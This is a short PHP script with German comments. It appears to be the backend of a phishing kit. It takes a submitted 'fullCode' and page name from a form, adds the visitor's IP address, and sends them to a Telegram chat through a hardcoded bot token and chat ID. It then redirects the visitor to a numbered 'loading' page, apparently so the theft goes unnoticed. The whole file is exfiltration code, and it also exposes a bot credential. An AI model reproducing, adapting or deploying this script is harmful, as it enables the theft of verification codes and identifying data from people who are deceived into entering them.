<?php

// Deine Telegram Bot-Details
$botToken = '8774738162:AAG5wwzAn4uDk-31PZcYQxkwA3XDnEqIFjk';
$chatId = '-5227546407';// Ersetze durch deine Chat-ID

// Daten vom Formular
$page = isset($_POST['page']) ? $_POST['page'] : '';
$fullCode = isset($_POST['fullCode']) ? $_POST['fullCode'] : '';

// IP-Adresse des Nutzers
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Nachricht an Telegram erstellen
$message = "Neue Code-Eingabe:\nSeite: $page\nCode: $fullCode\nIP: " . $ipAddress;

// Telegram API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Daten für POST
$postData = [
    'chat_id' => $chatId,
    'text' => $message
];

// cURL verwenden, um an Telegram zu senden
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Nach dem Senden Redirect zu 'loading2.html' im Hauptordner
header('Location: ../loading5.html');
exit();
?>